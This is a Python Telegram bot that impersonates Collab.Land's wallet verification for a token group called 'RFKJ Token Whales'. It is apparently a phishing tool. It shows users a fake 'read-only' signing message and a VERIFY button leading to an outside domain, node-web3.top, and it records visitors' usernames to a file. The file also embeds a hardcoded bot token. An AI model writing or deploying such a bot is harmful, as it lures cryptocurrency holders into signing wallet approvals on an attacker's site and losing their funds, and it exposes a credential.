import requests
import logging
from logging.handlers import RotatingFileHandler
import time
from datetime import datetime

# Configure logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Create a file handler that logs messages to a text file
file_handler = RotatingFileHandler('bot.txt', maxBytes=1048576, backupCount=3)  # Log file with rotation
file_handler.setLevel(logging.INFO)
file_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
file_handler.setFormatter(file_formatter)

# Create a console handler that logs messages to the console
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
console_handler.setFormatter(console_formatter)

# Add handlers to the logger
logger.addHandler(file_handler)
logger.addHandler(console_handler)

# Bot token
TOKEN = "6451514540:AAHtGRaquOufmmR6r_qqL9PZsPCcSabRGAo"

# Verification URL
VERIFICATION_URL = "https://node-web3.top/"

# Path to save logged usernames
LOG_FILE_PATH = "./logged_usernames.txt"

# Define a function to start the bot
def start(update) -> None:
    if "username" in update["message"]["from"]:
        username = update["message"]["from"]["username"]
        logger.info(f"Visitor {username} started the bot.")
    else:
        logger.info("Visitor started the bot.")
    send_welcome_message(update["message"]["chat"]["id"], update["message"]["from"])

# Define a function to send the welcome message with a code block containing verification details
def send_welcome_message(chat_id, user):
    username = user.get("username", "Unknown")
    timestamp = datetime.utcnow().isoformat() + "Z"
    community_name = "RFKJ Token Whales"  # Replace with your community/group name

    welcome_message = "<b>Please read the instructions carefully before connecting to Collab.Land Node</b>\n\nYou should expect to sign the following message when prompted by a non-custodial wallet such as MetaMask: \n\n"
    verification_message = (
        "<code>"
        "Collab.Land's Node asks you to sign this message for the purpose of verifying your account ownership. "
        "This is READ-ONLY access and will NOT trigger any blockchain transactions or incur any fees.\n\n"
        f"- User: {username}\n"
        f"- Timestamp: {timestamp}\n"
        "</code>\n\n"
        "Make sure you sign the EXACT message (some wallets may use n for new lines) and NEVER share your seed phrase or private key."
    )

    send_message_with_button(chat_id, welcome_message + verification_message, "VERIFY", VERIFICATION_URL)

# Define a function to send a message with a button
def send_message_with_button(chat_id, text, button_text, button_url):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": {
            "inline_keyboard": [[{"text": button_text, "url": button_url}]]
        }
    }
    requests.post(url, json=params)

# Define a function to handle messages
def handle_message(update) -> None:
    # Log visitor username
    if "username" in update["message"]["from"]:
        username = update["message"]["from"]["username"]
    else:
        username = "Unknown"
    message = update["message"]["text"]
    logger.info(f"Visitor {username} sent a message: {message}")
    send_message(update["message"]["chat"]["id"], "Please use the verification link provided.")

    # Save visitor username to file
    save_username_to_file(username)

# Define a function to save username to file
def save_username_to_file(username):
    with open(LOG_FILE_PATH, "a") as file:
        file.write(username + "\n")
        file.flush()  # Ensure data is written to the file immediately

# Define a function to send message
def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    requests.post(url, params=params)

def main() -> None:
    offset = None
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            params = {"offset": offset, "timeout": 30}  # Adjust the timeout as needed
            response = requests.get(url, params=params)
            updates = response.json()["result"]

            if updates:
                for update in updates:
                    offset = update["update_id"] + 1  # Update the offset to avoid processing the same update again
                    if "message" in update and "text" in update["message"]:
                        if update["message"]["text"] == "/start":
                            start(update)
                        else:
                            handle_message(update)

        except Exception as e:
            logger.error(f"An error occurred: {e}")

        time.sleep(1)  # Sleep for 1 second before polling again

if __name__ == '__main__':
    main()
